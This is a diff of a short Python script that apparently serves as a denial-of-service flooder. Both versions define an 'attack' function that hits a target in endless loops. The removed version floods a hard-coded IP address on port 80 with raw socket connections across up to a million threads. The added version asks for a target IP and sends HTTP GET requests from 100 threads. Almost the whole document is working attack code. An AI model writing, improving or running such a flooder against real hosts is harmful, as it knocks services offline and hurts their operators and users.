@@ -1,20 +1,23 @@
-import socket
+import requests
 import threading
 
-target_ip = "88.99.61.148"  # Replace with target IP (Test on your own server)
-target_port = 80  # Common ports: 80 (HTTP), 443 (HTTPS)
+# Get user input for the target IP
+target_ip = input("Enter Target IP: ")
+target_url = f"http://{target_ip}"  # Change to https:// if needed
 
+# Number of threads (simultaneous requests)
+num_threads = 100  # Adjust as needed
+
+# Function to send requests
 def attack():
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
-            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
-            s.close()
-        except:
-            pass  # Prevent script from stopping if an error occurs
+            response = requests.get(target_url, timeout=5)
+            print(f"Sent request to {target_url} | Status Code: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
 
-# Launch multiple threads
-for _ in range(1000000):  # Adjust number of threads
+# Start attack threads
+for _ in range(num_threads):
     thread = threading.Thread(target=attack)
     thread.start()
